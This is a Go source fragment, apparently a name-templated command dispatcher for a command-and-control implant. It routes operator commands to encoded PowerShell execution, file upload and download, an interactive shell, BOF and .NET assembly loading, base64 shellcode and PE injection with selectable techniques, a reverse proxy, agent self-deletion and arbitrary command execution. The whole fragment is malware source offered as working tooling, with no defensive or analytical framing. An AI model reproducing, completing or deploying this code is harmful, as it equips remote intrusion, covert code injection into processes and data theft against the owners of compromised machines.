// Core command processing functionality
func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {
    if strings.HasPrefix(command, "pwsh ") {
        encodedScript := command[5:] // Remove "pwsh " prefix
        result := a.{AGENT_HANDLE_MODULE_FUNC}(encodedScript)
        return result
    } else if strings.HasPrefix(command, "upload ") {
        result := a.{AGENT_HANDLE_UPLOAD_FUNC}(command)
        return result
    } else if strings.HasPrefix(command, "download ") {
        result := a.{AGENT_HANDLE_DOWNLOAD_FUNC}(command)
        return result
    } else if strings.HasPrefix(command, "tty_shell") {
        result := a.{AGENT_HANDLE_TTY_SHELL_FUNC}(command)
        return result
    } else if strings.HasPrefix(command, "sleep ") {
        result := a.{AGENT_HANDLE_SLEEP_FUNC}(command)
        return result
    } else if strings.HasPrefix(command, "bof ") {
        result := a.{AGENT_HANDLE_BOF_FUNC}(command)
        return result
    } else if strings.HasPrefix(command, "assembly ") {
        result := a.{AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command)
        return result
    } else if strings.HasPrefix(command, "pinject ") {
        // Handle shellcode injection command - can include technique parameter
        remainingCommand := command[8:] // Remove "pinject " prefix

        // Check if there's a technique specified
        parts := strings.SplitN(remainingCommand, " ", 2)
        var encodedShellcode string
        var technique string

        if len(parts) == 2 {
            // Technique specified: "technique encoded_shellcode"
            technique = strings.ToLower(parts[0])
            encodedShellcode = parts[1]
        } else {
            // No technique specified, use auto: "encoded_shellcode"
            technique = "auto"
            encodedShellcode = parts[0]
        }

        shellcodeData, err := base64.StdEncoding.DecodeString(encodedShellcode)
        if err != nil {
            return fmt.Sprintf("[ERROR] Invalid shellcode data format: %v", err)
        }

        result := a.{AGENT_INJECT_SHELLCODE_FUNC}_with_technique(shellcodeData, technique)
        return result
    } else if strings.HasPrefix(command, "peinject ") {
        // Handle PE injection command - base64 content follows directly after "peinject "
        encodedPE := command[9:] // Remove "peinject " prefix
        peData, err := base64.StdEncoding.DecodeString(encodedPE)
        if err != nil {
            return fmt.Sprintf("[ERROR] Invalid PE data format: %v", err)
        }
        result := a.{AGENT_INJECT_PE_FUNC}(peData)
        return result
    } else if command == "reverse_proxy_start" {
        go a.{AGENT_START_REVERSE_PROXY_FUNC}()
        return "[+] Reverse proxy started."
    } else if command == "reverse_proxy_stop" {
        a.{AGENT_STOP_REVERSE_PROXY_FUNC}()
        return "[+] Reverse proxy stopped."
    } else if command == "kill" {
        a.{AGENT_SELF_DELETE_FUNC}()
        return "[SUCCESS] Agent killed"
    } else {
        result := a.{AGENT_EXECUTE_FUNC}(command)
        return result
    }
}